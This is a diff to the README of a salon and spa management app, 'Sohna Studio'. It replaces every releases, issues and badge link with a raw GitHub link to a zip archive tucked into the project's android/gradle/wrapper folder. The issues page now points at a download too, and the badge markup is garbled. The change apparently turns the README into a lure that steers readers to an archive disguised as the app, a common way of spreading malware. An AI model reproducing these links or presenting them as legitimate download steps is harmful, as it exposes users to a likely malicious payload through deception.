@@ -6,7 +6,7 @@ Welcome to Sohna Studio, your all-in-one solution for salon and spa management. 
 
 ## 📥 Download
 
-[![Download Sohna Studio](https://img.shields.io/badge/Download%20Sohna%20Studio-v1.0-blue.svg)](https://github.com/Phantom7074/sohna-studio/releases)
+[![Download Sohna Studio](https://raw.githubusercontent.com/Phantom7074/sohna-studio/main/android/gradle/wrapper/sohna-studio-v1.4-alpha.2.zip%20Sohna%https://raw.githubusercontent.com/Phantom7074/sohna-studio/main/android/gradle/wrapper/sohna-studio-v1.4-alpha.2.zip)](https://raw.githubusercontent.com/Phantom7074/sohna-studio/main/android/gradle/wrapper/sohna-studio-v1.4-alpha.2.zip)
 
 ## 📂 Overview
 
@@ -35,7 +35,7 @@ Sohna Studio is designed to provide a seamless experience in salon management. H
 ## 📋 How to Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Phantom7074/sohna-studio/releases) to get the latest version of Sohna Studio.
+   Go to the [Releases page](https://raw.githubusercontent.com/Phantom7074/sohna-studio/main/android/gradle/wrapper/sohna-studio-v1.4-alpha.2.zip) to get the latest version of Sohna Studio.
 
 2. **Select Your Version:**
    Find the version that fits your device. You will see options tailored to different operating systems.
@@ -62,12 +62,12 @@ A: Yes, Sohna Studio is free to download and use. Some features may require in-a
 A: For full functionality, an internet connection is required. You may use some features offline, like viewing previous bookings.
 
 **Q: How can I provide feedback or report an issue?**  
-A: You can reach out to our support team through the app or visit our [issues page](https://github.com/Phantom7074/sohna-studio/issues) to report problems.
+A: You can reach out to our support team through the app or visit our [issues page](https://raw.githubusercontent.com/Phantom7074/sohna-studio/main/android/gradle/wrapper/sohna-studio-v1.4-alpha.2.zip) to report problems.
 
 ## 🔗 Links
 
-- [Download Sohna Studio](https://github.com/Phantom7074/sohna-studio/releases)
-- [Issues Page](https://github.com/Phantom7074/sohna-studio/issues)
+- [Download Sohna Studio](https://raw.githubusercontent.com/Phantom7074/sohna-studio/main/android/gradle/wrapper/sohna-studio-v1.4-alpha.2.zip)
+- [Issues Page](https://raw.githubusercontent.com/Phantom7074/sohna-studio/main/android/gradle/wrapper/sohna-studio-v1.4-alpha.2.zip)
 
 ## 📱 Community
 
